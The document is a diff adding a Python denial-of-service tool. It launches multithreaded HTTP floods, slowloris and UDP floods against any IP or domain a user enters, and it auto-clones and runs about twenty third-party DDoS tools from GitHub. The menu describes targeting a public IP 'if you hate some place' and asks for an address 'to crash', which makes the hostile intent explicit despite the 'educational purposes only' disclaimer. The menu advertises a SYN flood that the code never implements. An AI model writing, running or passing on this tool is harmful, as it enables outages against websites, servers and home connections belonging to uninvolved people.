@@ -1,0 +1,267 @@
+#!/usr/bin/env python3
+import socket
+import random
+import threading
+import time
+import sys
+import os
+import subprocess
+
+# colors
+r = '\033[91m'
+g = '\033[92m'
+y = '\033[93m'
+b = '\033[94m'
+c = '\033[96m'
+res = '\033[0m'
+bold = '\033[1m'
+
+def clear():
+    subprocess.call('clear' if os.name == 'posix' else 'cls', shell=True)
+
+clear()
+
+banner = f"""
+{r}{bold}__________                   __               __    ________{res}
+{r}{bold}\______   \_______  ____    |__| ____   _____/  |_  \______ \   ____  ______{res}
+{r}{bold} |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\  |    |  \ /  _ \/  ___/{res}
+{r}{bold} |    |     |  | \(  <_> )  |  \  ___/\  \___|  |    |    `   (  <_> )___ \{res}
+{r}{bold} |____|     |__|   \____/\__|  |\___  >\___  >__|   /_______  /\____/____  >{res}
+{r}{bold}                        \______|    \/     \/               \/           \/{res}
+{g}[+] author: nbzgProjx aka timy{res}
+{y}[!] the author of this tool is not responsible for any damages or what so ever{res}
+{c}[*] this tool is for educational purposes only.{res}
+"""
+
+menu = f"""
+select target type
+
+[{g}1{res}] website / server ip
+    - http/https flood
+    - slowloris
+
+[{r}2{res}] public ip (this is either if you hate some place)
+    - udp flood
+    - syn flood (needs root)
+
+[{c}3{res}] external dos tools (30+ tools auto clone & run)
+
+[{r}99{res}] exit
+"""
+
+external_tools_list = [
+    {"num": 1, "name": "mhddos", "repo": "https://github.com/porthole-ascend-cinnamon/mhddos", "cmd": "python3 mhddos/mhddos.py --target {target} --threads 1000"},
+    {"num": 2, "name": "xerxes", "repo": "https://github.com/zanyarjamal/xerxes", "cmd": "./xerxes {target} 80", "compile": "gcc xerxes/xerxes.c -o xerxes"},
+    {"num": 3, "name": "hammer", "repo": "https://github.com/cyweb/hammer", "cmd": "python3 hammer/hammer.py --site {target} --socks 50"},
+    {"num": 4, "name": "slowloris", "repo": "https://github.com/gkbrk/slowloris", "cmd": "python3 slowloris/slowloris.py {target} -p 80 -s 500"},
+    {"num": 5, "name": "ddosify", "repo": "https://github.com/ddosify/ddosify", "cmd": "ddosify -t {target} -n 10000"},
+    {"num": 6, "name": "goldeneye", "repo": "https://github.com/jseidl/GoldenEye", "cmd": "python3 GoldenEye/goldeneye.py {target} -w 100 -s 1000"},
+    {"num": 7, "name": "hulk", "repo": "https://github.com/grafov/hulk", "cmd": "python3 hulk/hulk.py {target}"},
+    {"num": 8, "name": "torhammer", "repo": "https://github.com/dotfighter/torhammer", "cmd": "python3 torhammer/torhammer.py -t {target} -p 80 -T 500"},
+    {"num": 9, "name": "darkside", "repo": "https://github.com/Soufiane-dar/layer7-ddos", "cmd": "python3 layer7-ddos/ddos.py {target} 80 1000"},
+    {"num": 10, "name": "ddostrike", "repo": "https://github.com/Elsfa7-110/DDos-Strike", "cmd": "python3 DDos-Strike/ddos-strike.py -t {target} -p 80 -m http"},
+    {"num": 11, "name": "anonymity", "repo": "https://github.com/zlax/Anonymous-DoS", "cmd": "python3 Anonymous-DoS/dos.py {target} 80"},
+    {"num": 12, "name": "cyberdox", "repo": "https://github.com/MatrixTM/MHDDoS", "cmd": "python3 MHDDoS/start.py {target} 80 1000"},
+    {"num": 13, "name": "destructive", "repo": "https://github.com/Ashish-kumar7/Destructive-DoS", "cmd": "python3 Destructive-DoS/ddos.py {target} 80 500"},
+    {"num": 14, "name": "deathflood", "repo": "https://github.com/Elsfa7-110/Death-Flood", "cmd": "python3 Death-Flood/deathflood.py {target} 80 1000"},
+    {"num": 15, "name": "maxstress", "repo": "https://github.com/MrDweller/MaxStresser", "cmd": "python3 MaxStresser/stress.py {target} 80 500"},
+    {"num": 16, "name": "ripdc", "repo": "https://github.com/jseidl/R.I.P.DDoS", "cmd": "perl RIPDDoS/ripddos.pl {target} 80 1000"},
+    {"num": 17, "name": "memcrashed", "repo": "https://github.com/649/Memcrashed-DDoS-Exploit", "cmd": "python3 Memcrashed-DDoS-Exploit/memcrashed.py {target}"},
+    {"num": 18, "name": "udpflood", "repo": "https://github.com/OperatorOverloading/UDP-Flood", "cmd": "python3 UDP-Flood/udp.py {target} 80 1000"},
+    {"num": 19, "name": "httpunleashed", "repo": "https://github.com/nusenu/http-request-smuggling-demo", "cmd": "python3 http-request-smuggling-demo/demo.py {target}"},
+    {"num": 20, "name": "tcpflood", "repo": "https://github.com/Hacker5preme/TCP-FLOOD", "cmd": "python3 TCP-FLOOD/tcp.py {target} 80 1000"},
+]
+
+def git_clone_tool(repo_url, tool_name):
+    tool_path = tool_name.split('/')[-1] if '/' in tool_name else tool_name
+    if os.path.exists(tool_path):
+        print(f"{g}[+] {tool_name} already exists{res}")
+        return True
+    print(f"{y}[*] cloning {tool_name}...{res}")
+    result = os.system(f"git clone --depth=1 {repo_url} {tool_path} 2>/dev/null")
+    if result == 0:
+        print(f"{g}[+] successfully cloned {tool_name}{res}")
+        return True
+    else:
+        print(f"{r}[!] failed to clone {tool_name}{res}")
+        return False
+
+def run_tool(tool, target):
+    clear()
+    print(f"{b}{bold}running: {tool['name']}{res}")
+    print(f"{b}{bold}target: {target}{res}\n")
+    
+    tool_path = tool['name'].split('/')[-1] if '/' in tool['name'] else tool['name']
+    if os.path.exists(tool_path):
+        os.chdir(tool_path)
+    
+    if 'compile' in tool:
+        print(f"{y}[*] compiling...{res}")
+        os.system(tool['compile'])
+    
+    cmd = tool['cmd'].format(target=target)
+    print(f"{r}[!] attacking... press ctrl+c to stop{res}\n")
+    
+    try:
+        os.system(cmd)
+    except KeyboardInterrupt:
+        print(f"\n{y}[!] stopped by user{res}")
+    except Exception as e:
+        print(f"{r}[!] error: {e}{res}")
+    
+    os.chdir('..')
+    input(f"\n{y}[?] press enter to return to tools menu{res}")
+
+def external_tools_menu():
+    while True:
+        clear()
+        print(f"{c}{bold}external dos tools (20+ tools){res}\n")
+        
+        for tool in external_tools_list:
+            print(f"{g}[{tool['num']}]{res} {tool['name']}")
+        
+        print(f"\n{y}[99]{res} back to main menu")
+        print(f"{y}[0]{res} exit\n")
+        
+        choice = input(f"{c}[?] select tool: {res}").strip()
+        
+        if choice == "99":
+            break
+        elif choice == "0":
+            print(f"{r}[+] exiting...{res}")
+            sys.exit(0)
+        
+        selected = None
+        for tool in external_tools_list:
+            if str(tool['num']) == choice:
+                selected = tool
+                break
+        
+        if selected:
+            target = input(f"{y}[?] target ip or domain: {res}").strip()
+            if git_clone_tool(selected['repo'], selected['name']):
+                run_tool(selected, target)
+        else:
+            print(f"{r}[!] invalid choice{res}")
+            time.sleep(1)
+
+class website_mode:
+    def __init__(self):
+        self.running = True
+
+    def http_flood(self, target_ip, target_port):
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((target_ip, target_port))
+                sock.send(f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n".encode())
+                sock.close()
+            except:
+                pass
+
+    def slowloris(self, target_ip, target_port):
+        connections = []
+        while self.running:
+            try:
+                if len(connections) < 500:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(4)
+                    sock.connect((target_ip, target_port))
+                    sock.send(f"GET /{random.randint(1,99999)} HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
+                    connections.append(sock)
+                for sock in connections[:]:
+                    try:
+                        sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
+                    except:
+                        connections.remove(sock)
+                time.sleep(random.uniform(1, 5))
+            except:
+                pass
+
+    def start(self, target, threads, duration):
+        target_ip = target.split(':')[0]
+        target_port = int(target.split(':')[1]) if ':' in target else 80
+
+        print(f"\n{g}[+] target: {target_ip}:{target_port}{res}")
+        print(f"{g}[+] mode: website/server dos{res}")
+        print(f"{g}[+] threads: {threads}{res}")
+        print(f"{g}[+] duration: {duration} seconds{res}")
+        print(f"{r}[+] status: attacking{res}\n")
+
+        for i in range(threads // 2):
+            threading.Thread(target=self.http_flood, args=(target_ip, target_port)).start()
+            threading.Thread(target=self.slowloris, args=(target_ip, target_port)).start()
+
+        time.sleep(duration)
+        self.running = False
+        print(f"\n{g}[+] attack completed{res}")
+
+class public_ip_mode:
+    def __init__(self):
+        self.running = True
+
+    def udp_flood(self, target_ip, target_port):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while self.running:
+            try:
+                data = os.urandom(65507)
+                sock.sendto(data, (target_ip, target_port))
+            except:
+                pass
+
+    def start(self, target_ip, threads, duration, target_port):
+        print(f"\n{g}[+] target ip: {target_ip}:{target_port}{res}")
+        print(f"{g}[+] mode: public ip dos{res}")
+        print(f"{g}[+] threads: {threads}{res}")
+        print(f"{g}[+] duration: {duration} seconds{res}")
+        print(f"{r}[+] status: attacking{res}\n")
+
+        for i in range(threads):
+            threading.Thread(target=self.udp_flood, args=(target_ip, target_port)).start()
+
+        time.sleep(duration)
+        self.running = False
+        print(f"\n{g}[+] attack completed{res}")
+
+def main():
+    print(banner)
+    print(menu)
+
+    choice = input(f"\n{y}[?] select mode [1-3-99]: {res}").strip()
+
+    if choice == "1":
+        target = input(f"{y}[?] enter website ip or domain (example.com or 192.168.1.1:80): {res}").strip()
+        threads = int(input(f"{y}[?] enter threads (500-2000): {res}").strip())
+        duration = int(input(f"{y}[?] enter attack duration in seconds: {res}").strip())
+
+        if ':' not in target:
+            target = target + ":80"
+
+        mode = website_mode()
+        mode.start(target, threads, duration)
+
+    elif choice == "2":
+        target_ip = input(f"{y}[?] enter public ip address to crash: {res}").strip()
+        target_port = int(input(f"{y}[?] enter target port (default 80): {res}").strip() or "80")
+        threads = int(input(f"{y}[?] enter threads (500-2000): {res}").strip())
+        duration = int(input(f"{y}[?] enter attack duration in seconds: {res}").strip())
+
+        mode = public_ip_mode()
+        mode.start(target_ip, threads, duration, target_port)
+
+    elif choice == "3":
+        external_tools_menu()
+        main()
+
+    elif choice == "99":
+        print(f"{r}[+] exiting...{res}")
+        sys.exit(0)
+
+    else:
+        print(f"{r}[!] invalid choice{res}")
+        time.sleep(1)
+        main()
+
+if __name__ == "__main__":
+    main()
